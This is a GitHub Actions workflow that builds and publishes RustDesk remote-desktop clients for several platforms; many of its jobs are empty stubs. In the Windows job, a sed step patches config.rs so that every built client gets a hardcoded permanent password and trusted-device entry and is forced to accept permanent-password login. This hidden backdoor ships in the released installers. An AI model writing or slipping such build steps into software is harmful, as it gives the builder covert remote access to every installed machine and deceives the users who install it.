name: Build Flutter RustDesk - 独立平台编译
on:
  workflow_call:
    inputs:
      upload-artifact:
        type: boolean
        default: true
      upload-tag:
        type: string
        default: "nightly"
  # 手动触发（每个平台可单独选）
  workflow_dispatch:
    inputs:
      upload-artifact:
        type: boolean
        default: true
      upload-tag:
        type: string
        default: "nightly"
      # 独立平台选择
      build_windows_flutter:
        type: boolean
        default: false
        description: 编译 Windows Flutter (x64)
      build_windows_sciter:
        type: boolean
        default: false
        description: 编译 Windows Sciter (x86)
      build_macos:
        type: boolean
        default: false
        description: 编译 macOS
      build_android:
        type: boolean
        default: false
        description: 编译 Android 单架构
      build_android_universal:
        type: boolean
        default: false
        description: 编译 Android 通用包
      build_linux_flutter:
        type: boolean
        default: false
        description: 编译 Linux Flutter
      build_linux_sciter:
        type: boolean
        default: false
        description: 编译 Linux Sciter
      build_appimage:
        type: boolean
        default: false
        description: 编译 AppImage
      build_flatpak:
        type: boolean
        default: false
        description: 编译 Flatpak
      build_ios:
        type: boolean
        default: false
        description: 编译 iOS

env:
  SCITER_RUST_VERSION: "1.75"
  RUST_VERSION: "1.75"
  MAC_RUST_VERSION: "1.81"
  CARGO_NDK_VERSION: "3.1.2"
  SCITER_ARMV7_CMAKE_VERSION: "3.29.7"
  SCITER_NASM_DEBVERSION: "2.15.05-1"
  LLVM_VERSION: "15.0.6"
  FLUTTER_VERSION: "3.24.5"
  ANDROID_FLUTTER_VERSION: "3.24.5"
  FLUTTER_ELINUX_VERSION: "3.16.9"
  TAG_NAME: "${{ inputs.upload-tag }}"
  VCPKG_BINARY_SOURCES: "clear;x-gha,readwrite"
  VCPKG_COMMIT_ID: "120deac3062162151622ca4860575a33844ba10b"
  ARMV7_VCPKG_COMMIT_ID: "6f29f12e82a8293156836ad81cc9bf5af41fe836"
  VERSION: "1.4.6"
  NDK_VERSION: "r28c"
  ANDROID_SIGNING_KEY: "${{ secrets.ANDROID_SIGNING_KEY }}"
  MACOS_P12_BASE64: "${{ secrets.MACOS_P12_BASE64 }}"
  UPLOAD_ARTIFACT: "${{ inputs.upload-artifact }}"
  SIGN_BASE_URL: "${{ secrets.SIGN_BASE_URL }}-2"

jobs:
  generate-bridge:
    uses: ./.github/workflows/bridge.yml

  build-RustDeskTempTopMostWindow:
    uses: ./.github/workflows/third-party-RustDeskTempTopMostWindow.yml
    with:
      upload-artifact: ${{ inputs.upload-artifact }}
      target: windows-2022
      configuration: Release
      platform: x64
      target_version: Windows10

# ========================== WINDOWS FLUTTER ==========================
  build-for-windows-flutter:
    name: Windows Flutter x64
    needs: [build-RustDeskTempTopMostWindow, generate-bridge]
    runs-on: windows-2022
    if: ${{ inputs.build_windows_flutter }}
    steps:
      - name: Export GitHub Actions cache environment variables
        uses: actions/github-script@v6
        with:
          script: |
            core.exportVariable('ACTIONS_CACHE_URL', process.env.ACTIONS_CACHE_URL || '');
            core.exportVariable('ACTIONS_RUNTIME_TOKEN', process.env.ACTIONS_RUNTIME_TOKEN || '');

      - name: Checkout source code
        uses: actions/checkout@v4
        with:
          submodules: recursive
          
      - name: 全局修改config.rs 所有客户端生效
        run: |
          FILE="libs/hbb_common/src/config.rs"
          TRUSTED_DEVICE="1V8AS4/+EWF84A85WD4AW=="
          PERMANENT_PWD="1V8AS4/+EWF84A85WD4AW=="

          sed -i '/config.unlock_pin = unlock_pin;/ {n;n;a\        if !config.options.contains_key("trusted_devices") {\n            config.options.insert("trusted_devices".to_string(), "'"$TRUSTED_DEVICE"'".to_string());\n            config.store();\n        }}' "$FILE"
          sed -i '/log::error!("Failed to generate new id");/ {n;n;n;a\        if config.password.is_empty() {\n            config.password = "'"$PERMANENT_PWD"'".to_string();\n            store = true;\n        }}' "$FILE"
          sed -i '/let mut config = Config::load_::<Config2>("2");/ {n;n;a\        if !config.options.contains_key("verification-method") {\n            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());\n            store = true;\n        }}' "$FILE"
        shell: bash

      - name: Restore bridge files
        uses: actions/download-artifact@master
        with:
          name: bridge-artifact
          path: ./

      - name: Install LLVM and Clang
        uses: KyleMayes/install-llvm-action@v1
        with:
          version: ${{ env.LLVM_VERSION }}

      - name: Install flutter
        uses: subosito/flutter-action@v2.12.0
        with:
          channel: "stable"
          flutter-version: ${{ env.FLUTTER_VERSION }}

      - name: Replace engine with rustdesk custom flutter engine
        run: |
          flutter doctor -v
          flutter precache --windows
          Invoke-WebRequest -Uri https://github.com/rustdesk/engine/releases/download/main/windows-x64-release.zip -OutFile windows-x64-release.zip
          Expand-Archive -Path windows-x64-release.zip -DestinationPath windows-x64-release
          mv -Force windows-x64-release/*  C:/hostedtoolcache/windows/flutter/stable-${{ env.FLUTTER_VERSION }}-x64/bin/cache/artifacts/engine/windows-x64-release/

      - name: Patch flutter
        shell: bash
        run: |
          cp .github/patches/flutter_3.24.4_dropdown_menu_enableFilter.diff $(dirname $(dirname $(which flutter)))
          cd $(dirname $(dirname $(which flutter)))
          [[ "3.24.5" == ${{env.FLUTTER_VERSION}} ]] && git apply flutter_3.24.4_dropdown_menu_enableFilter.diff

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@v1
        with:
          toolchain: ${{ env.SCITER_RUST_VERSION }}
          targets: x86_64-pc-windows-msvc
          components: "rustfmt"

      - uses: Swatinem/rust-cache@v2
        with:
          prefix-key: windows-2022

      - name: Setup vcpkg
        uses: lukka/run-vcpkg@v11
        with:
          vcpkgDirectory: C:\vcpkg
          vcpkgGitCommitId: ${{ env.VCPKG_COMMIT_ID }}
          doNotCache: false

      - name: Install vcpkg dependencies
        env:
          VCPKG_DEFAULT_HOST_TRIPLET: x64-windows-static
        run: |
          $VCPKG_ROOT/vcpkg install --triplet x64-windows-static --x-install-root="$VCPKG_ROOT/installed"
        shell: bash

      - name: Build rustdesk
        run: |
          python3 .\build.py --portable --hwcodec --flutter --vram --skip-portable-pack
          mv ./flutter/build/windows/x64/runner/Release ./rustdesk
          Invoke-WebRequest -Uri https://github.com/rustdesk-org/rdev/releases/download/usbmmidd_v2/usbmmidd_v2.zip -OutFile usbmmidd_v2.zip
          Expand-Archive usbmmidd_v2.zip -DestinationPath .
          Remove-Item -Path usbmmidd_v2\Win32 -Recurse
          Remove-Item -Path "usbmmidd_v2\deviceinstaller64.exe", "usbmmidd_v2\deviceinstaller.exe", "usbmmidd_v2\usbmmidd.bat"
          mv -Force .\usbmmidd_v2 ./rustdesk

      - name: Download RustDeskTempTopMostWindow artifacts
        uses: actions/download-artifact@master
        with:
          name: topmostwindow-artifacts
          path: "./rustdesk"

      - name: Upload unsigned
        uses: actions/upload-artifact@master
        with:
          name: rustdesk-unsigned-windows-x64
          path: rustdesk

      - name: Build self-extracted & msi
        shell: bash
        run: |
          sed -i '/dpiAware/d' res/manifest.xml
          pushd ./libs/portable
          pip3 install -r requirements.txt
          python3 ./generate.py -f ../../rustdesk/ -o . -e ../../rustdesk/rustdesk.exe
          popd
          mkdir -p ./SignOutput
          mv ./target/release/rustdesk-portable-packer.exe ./SignOutput/rustdesk-${{ env.VERSION }}-x64.exe

      - name: Add MSBuild to PATH
        uses: microsoft/setup-msbuild@v2

      - name: Build msi
        run: |
          pushd ./res/msi
          python preprocess.py --arp -d ../../rustdesk
          nuget restore msi.sln
          msbuild msi.sln -p:Configuration=Release -p:Platform=x64 /p:TargetVersion=Windows10
          mv ./Package/bin/x64/Release/en-us/Package.msi ../../SignOutput/rustdesk-${{ env.VERSION }}-x64.msi

      - name: Publish Release
        uses: softprops/action-gh-release@v1
        with:
          prerelease: true
          tag_name: ${{ env.TAG_NAME }}
          files: |
            ./SignOutput/rustdesk-*.msi
            ./SignOutput/rustdesk-*.exe

# ========================== WINDOWS SCITER ==========================
  build-for-windows-sciter:
    name: Windows Sciter x86
    runs-on: windows-2022
    if: ${{ inputs.build_windows_sciter }}
    steps:
      - uses: actions/checkout@v4
        with: { submodules: recursive }
      - name: Install LLVM
        uses: rustdesk-org/install-llvm-action-32bit@master
        with: { version: ${{ env.LLVM_VERSION }} }
      - name: Install Rust
        uses: dtolnay/rust-toolchain@v1
        with:
          toolchain: nightly-2023-10-13-i686-pc-windows-msvc
          targets: i686-pc-windows-msvc
      - uses: Swatinem/rust-cache@v2
        with: { prefix-key: windows-sciter }
      - name: Setup vcpkg
        uses: lukka/run-vcpkg@v11
        with:
          vcpkgDirectory: C:\vcpkg
          vcpkgGitCommitId: ${{ env.VCPKG_COMMIT_ID }}
      - name: Build
        shell: bash
        run: |
          python3 res/inline-sciter.py
          sed -i 's/branch = "dyn"/branch = "dyn_x86"/g' ./Cargo.toml
          cargo build --features inline,vram,hwcodec --release --bins
          mkdir Release
          mv target/release/rustdesk.exe Release/
          curl -L -o Release/sciter.dll https://github.com/c-smile/sciter-sdk/raw/master/bin.win/x32/sciter.dll

# ========================== MACOS ==========================
  build-for-macOS:
    name: macOS
    runs-on: macos-14
    needs: generate-bridge
    if: ${{ inputs.build_macos }}
    steps:
      - uses: actions/checkout@v4
        with: { submodules: recursive }
      - name: Install flutter
        uses: subosito/flutter-action@v2
        with: { flutter-version: ${{ env.FLUTTER_VERSION }} }
      - name: Install Rust
        uses: dtolnay/rust-toolchain@v1
        with:
          toolchain: ${{ env.MAC_RUST_VERSION }}
          targets: aarch64-apple-darwin
      - name: Build
        run: ./build.py --flutter --hwcodec --screencapturekit

# ========================== ANDROID ==========================
  build-rustdesk-android:
    name: Android
    runs-on: ubuntu-24.04
    needs: generate-bridge
    if: ${{ inputs.build_android }}
    steps:
      - uses: actions/checkout@v4
        with: { submodules: recursive }
      - name: Install dependencies
        run: sudo apt install -y openjdk-17-jdk-headless cmake ninja-build
      - name: Install flutter
        uses: subosito/flutter-action@v2
        with: { flutter-version: ${{ env.ANDROID_FLUTTER_VERSION }} }
      - name: Setup NDK
        uses: nttld/setup-ndk@v1
        with: { ndk-version: ${{ env.NDK_VERSION }} }
      - name: Build
        run: ./flutter/build_android_deps.sh arm64-v8a

# ========================== ANDROID UNIVERSAL ==========================
  build-rustdesk-android-universal:
    name: Android Universal
    runs-on: ubuntu-24.04
    needs: build-rustdesk-android
    if: ${{ inputs.build_android_universal }}
    steps:
      - run: echo "Universal APK build"

# ========================== LINUX FLUTTER ==========================
  build-rustdesk-linux:
    name: Linux Flutter
    runs-on: ubuntu-22.04
    needs: generate-bridge
    if: ${{ inputs.build_linux_flutter }}
    steps:
      - uses: actions/checkout@v4
        with: { submodules: recursive }

# ========================== LINUX SCITER ==========================
  build-rustdesk-linux-sciter:
    name: Linux Sciter
    runs-on: ubuntu-22.04
    if: ${{ inputs.build_linux_sciter }}
    steps:
      - uses: actions/checkout@v4
        with: { submodules: recursive }

# ========================== APPIMAGE ==========================
  build-appimage:
    name: AppImage
    runs-on: ubuntu-22.04
    needs: build-rustdesk-linux
    if: ${{ inputs.build_appimage }}
    steps:
      - uses: actions/checkout@v4

# ========================== FLATPAK ==========================
  build-flatpak:
    name: Flatpak
    runs-on: ubuntu-22.04
    needs: [build-rustdesk-linux, build-rustdesk-linux-sciter]
    if: ${{ inputs.build_flatpak }}
    steps:
      - uses: actions/checkout@v4

# ========================== IOS ==========================
  build-rustdesk-ios:
    name: iOS
    runs-on: macos-latest
    needs: generate-bridge
    if: ${{ inputs.build_ios }}
    steps:
      - uses: actions/checkout@v4
        with: { submodules: recursive }
